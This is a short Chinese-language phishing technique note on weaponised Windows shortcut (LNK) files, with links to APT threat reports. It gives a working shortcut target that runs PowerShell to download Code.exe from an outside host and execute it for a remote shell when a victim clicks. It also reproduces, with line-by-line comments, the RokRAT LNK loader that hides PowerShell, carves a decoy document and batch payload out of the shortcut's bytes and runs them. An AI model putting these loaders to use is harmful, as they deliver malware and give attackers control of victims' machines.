# LNK伪造

## LNK+Powershell

> [疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com)](https://mp.weixin.qq.com/s/TbiXJ359ZXOyQYWsfVDwGA)
>
> [利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/K70x)

新建一个快捷方式然后修改目标为如下信息:

```cmd
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr http://100.1.1.131:8000/download/local/Code.exe -outfile $env:TEMP\Code.exe;start-process $env:TEMP\Code.exe
```

![image-20240626114316470](http://cdn.ayusummer233.top/DailyNotes/202406261143196.png)

当受害者点击该快捷方式后则会调起powershell下载恶意程序并执行上线shell

![image-20240626114445251](http://cdn.ayusummer233.top/DailyNotes/202406261144336.png)

---

## Office OLE + LNK

> [常见钓鱼招式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD)



---

## APT

### ROKRAT

> [RokRAT（恶意软件家族） --- RokRAT (Malware Family) (fraunhofer.de)](https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat)
>
> [利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/K70x)
>
> [安全星图平台 (dbappsecurity.com.cn)](https://starmap.dbappsecurity.com.cn/blog/articles/2023/04/27/apt37-rokrat/)
>
> [APT37组织主战远控武器RokRAT，更新迭代部分执行流程 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/13851?time__1311=mqmxnQG%3DKDu0D%2F%2BG7DyQ5GODB07KG8f79eD&alichlgref=https%3A%2F%2Fwww.google.com%2F)
>
> [猎影追踪：APT37利用朝鲜政治话题针对韩国的攻击活动分析 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA%3D%3D&mid=2247496455&idx=1&sn=0e3af7d734671a41c9d796e7f33b085d&chksm=f9ed9fb8ce9a16ae8e9714f116e0812994e0e3d13eb75d05182e623372fc5b979d70cf403f39&scene=178&cur_album_id=1375769135073951745)

```cmd
"C:\Windows\SyswOW64\cmd.exe" /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'system32' -or $dirPath -Match 'Program Files') {$dirPath = 'C:\Users\Admin\AppData\Local\Temp'};$Lnkpath = Get-Childltem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eg 0x0001DAB452} ^| Select-Object -ExpandProperty FullName;$pdfFile = gc $Lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; $pdfPath = 'c:Users\Admin\AppData\Local\Temp\230401.hwp'; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; 
^& $pdfPath; $exeFile = gc $Lnkpath -Encoding Byte -TotalCount 00068696 -ReadCount 00068696; $exePath = 'c:/Users/Admin/AppData/Local/Temp/230401.bat'; sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; ^& $exePath;
```

```powershell
"C:\Windows\SyswOW64\cmd.exe" /c powershell -windowstyle hidden 
# 获取当前路径
$dirPath = Get-Location; 
# 如果当前路径包含system32或者Program Files，则将 dirPtah 设置到临时目录
if($dirPath -Match 'system32' -or $dirPath -Match 'Program Files') {$dirPath = 'C:\Users\Admin\AppData\Local\Temp'};
# 获取 dirPath 下文件大小为0x0001DAB452的
$Lnkpath = Get-Childltem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eg 0x0001DAB452} ^| Select-Object -ExpandProperty FullName;
# Get-Contet 一次性获取 Lnkpath 对应文件开头的 65446 字节 存储到 $pdfFile
$pdfFile = gc $Lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; 
$pdfPath = 'c:Users\Admin\AppData\Local\Temp\230401.hwp'; 
# Set-Content 跳过 $pdfFile 的前 2470 字节将剩余内容 写入到 $pdfPath
sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; 
# 运行 $pdfPath
^& $pdfPath; 
# 一次性获取 Lnkpath 对应文件开头的 68696 字节 存储到 $exeFile
$exeFile = gc $Lnkpath -Encoding Byte -TotalCount 00068696 -ReadCount 00068696; 
$exePath = 'c:/Users/Admin/AppData/Local/Temp/230401.bat'; 
# Set-Content 跳过 $exeFile 的前 65446 字节将剩余内容 写入到 $exePath
sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; 
# 运行 $exePath
^& $exePath;
```

具体分析可以参阅 [APT37组织主战远控武器RokRAT，更新迭代部分执行流程 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/13851?time__1311=mqmxnQG%3DKDu0D%2F%2BG7DyQ5GODB07KG8f79eD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0)

---

## 相关链接

- [钓鱼姿势汇总 - 简书 (jianshu.com)](https://www.jianshu.com/p/dcd250593698)

---





